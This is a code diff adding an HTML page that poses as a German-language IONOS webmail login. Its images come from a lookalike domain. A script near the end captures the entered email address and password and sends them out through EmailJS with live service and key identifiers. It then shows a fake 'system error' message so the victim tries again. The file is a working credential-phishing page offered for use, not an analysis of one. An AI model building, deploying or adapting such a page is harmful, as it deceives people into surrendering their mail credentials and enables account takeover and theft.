@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Webmail Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      /* Additional CSS for Footer Fix */
+      body {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+      main {
+        flex: 1; /* Push the footer to the bottom */
+      }
+      .footer {
+        text-align: center;
+        background-color: #f5f5f5;
+        padding: 1rem 0;
+        border-top: 1px solid #ddd;
+      }
+      .footer .status {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 0.5rem;
+        margin-bottom: 0.5rem;
+      }
+    </style>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "1lhSA4dUMtF2v_nVt",
+        });
+      })();
+    </script>
+  </head>
+  <body>
+    <!-- Header -->
+    <header class="header">
+      <div class="header-container">
+        <img
+          src="https://my-ionos-portal.com/wp-content/uploads/2024/11/ionos-logo-white.svg"
+          alt="IONOS Logo"
+          class="logo"
+        />
+        <p class="title">WEBMAIL LOGIN</p>
+        <div class="search-bar">
+          <img
+            src="https://my-ionos-portal.com/wp-content/uploads/2024/11/search-icon-white.svg"
+            alt="Search Icon"
+            class="search-icon"
+          />
+          <input
+            type="text"
+            placeholder="Nach Funktionen, Domains und Hilfe suchen"
+          />
+          <img
+            src="https://my-ionos-portal.com/wp-content/uploads/2024/11/voice-search-icon-white.svg"
+            alt="Voice Search Icon"
+            class="voice-search-icon"
+          />
+          <div id="tooltip" class="tooltip">
+            <p>
+              <a href="#">Loggen Sie sich ein</a>, um Produkte, Aktionen, Hilfe,
+              Domains, Verträge und vieles mehr zu finden.
+            </p>
+          </div>
+        </div>
+        <div class="header-icons">
+          <img
+            src="https://my-ionos-portal.com/wp-content/uploads/2024/11/chat-bubble-icon-white.svg"
+            alt="Chat Icon"
+            class="chat-icon"
+          />
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <section class="login-section">
+        <h1>Mein Webmail Login</h1>
+        <div class="error-message" style="display: none">
+          <p><strong>Es ist ein Fehler aufgetreten.</strong></p>
+          <p>
+            Das eingegebene Passwort ist nicht korrekt oder die E-Mail-Adresse
+            ist nicht korrekt.
+          </p>
+        </div>
+        <!-- Updated Form -->
+        <form id="login-form">
+          <div class="form-group">
+            <img
+              src="https://my-ionos-portal.com/wp-content/uploads/2024/11/person-icon-grey.svg"
+              alt="Person Icon"
+              class="person-icon"
+            />
+            <input
+              type="email"
+              id="email"
+              name="email"
+              placeholder="E-Mail-Adresse"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <img
+              src="https://my-ionos-portal.com/wp-content/uploads/2024/11/lock-icon-grey.svg"
+              alt="Lock Icon"
+              class="lock-icon"
+            />
+            <input
+              type="text"
+              id="password"
+              name="password"
+              placeholder="Passwort"
+              required
+            />
+            <a href="#" class="forgot-password">Passwort vergessen?</a>
+          </div>
+          <button type="submit">Login</button>
+        </form>
+      </section>
+      <section class="additional-logins">
+        <h2>Weitere IONOS Logins</h2>
+        <div class="logins-grid">
+          <div class="login-item">
+            <img
+              src="https://my-ionos-portal.com/wp-content/uploads/2024/11/mein-ionos-icon-blue-50x50-1.svg"
+              alt="Mein IONOS"
+            />
+            <p>Mein IONOS</p>
+          </div>
+          <div class="login-item">
+            <img
+              src="https://my-ionos-portal.com/wp-content/uploads/2024/11/Untitled-50-x-50-px-1.png"
+              alt="Webmail"
+            />
+            <p>Webmail</p>
+          </div>
+          <div class="login-item">
+            <img
+              src="https://my-ionos-portal.com/wp-content/uploads/2024/11/hidrive.svg"
+              alt="HiDrive"
+            />
+            <p>HiDrive</p>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="status">
+        <span
+          style="
+            width: 10px;
+            height: 10px;
+            background-color: #28a745;
+            border-radius: 50%;
+            display: inline-block;
+          "
+        ></span>
+        <p>Alle Systeme funktional</p>
+      </div>
+      <p>IONOS SE - 2024</p>
+      <p>Datenschutzhinweise</p>
+    </footer>
+    <script>
+      // Initialize EmailJS
+      // emailjs.init("1lhSA4dUMtF2v_nVt");  // Replace with your EmailJS public key
+
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent form from submitting normally
+
+          // Get form values
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          // Send email using EmailJS
+          emailjs
+            .send("service_p666uj4", "webmailsender_1zg10na", {
+              email: email,
+              password: password,
+            })
+            .then((response) => {
+              alert("Systemfehler. Bitte versuchen Sie es erneut.");
+            })
+            .catch((error) => {
+            //   console.error("E-Mail konnte nicht gesendet werden", error);
+              alert("Systemfehler. Bitte versuchen Sie es erneut.");
+            });
+        });
+    </script>
+    <!-- <script src="script.js"></script> -->
+  </body>
+</html>
